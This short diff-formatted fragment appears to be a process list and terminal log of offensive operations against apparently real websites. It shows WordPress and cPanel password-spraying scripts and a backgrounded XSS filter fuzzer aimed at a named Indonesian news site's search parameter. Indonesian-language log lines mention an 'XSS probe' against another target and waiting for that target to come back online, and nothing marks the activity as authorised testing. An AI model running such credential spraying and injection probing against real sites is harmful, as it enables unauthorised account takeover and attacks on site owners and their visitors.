@@ -1,0 +1,6 @@
+8326 python3 p2s/wp_spray.py
+12849 /bin/bash -c cd /home/runner && setsid nohup python3 p2s/filter_fuzz.py "https://mediaaksara.id/?s=%s" 5 > p2s/fuzz_ma.log 2>&1 < /dev/null & sleep 40; echo "--- cPanel spray (mati/blok?) ---"; pgrep -cf "[c]p_spray.py"; tail -4 p2s/cp_spray.log; echo "--- wp spray ---"; tail -3 p2s/wp_spray.log; echo "--- fuzz mulai ---"; cat p2s/fuzz_ma.log
+12851 python3 p2s/filter_fuzz.py https://mediaaksara.id/?s=%s 5
+--- log ---
+=== XSS probe: cigombong (jeda 12s) ===
+nunggu target hidup (maks ~30 menit)...
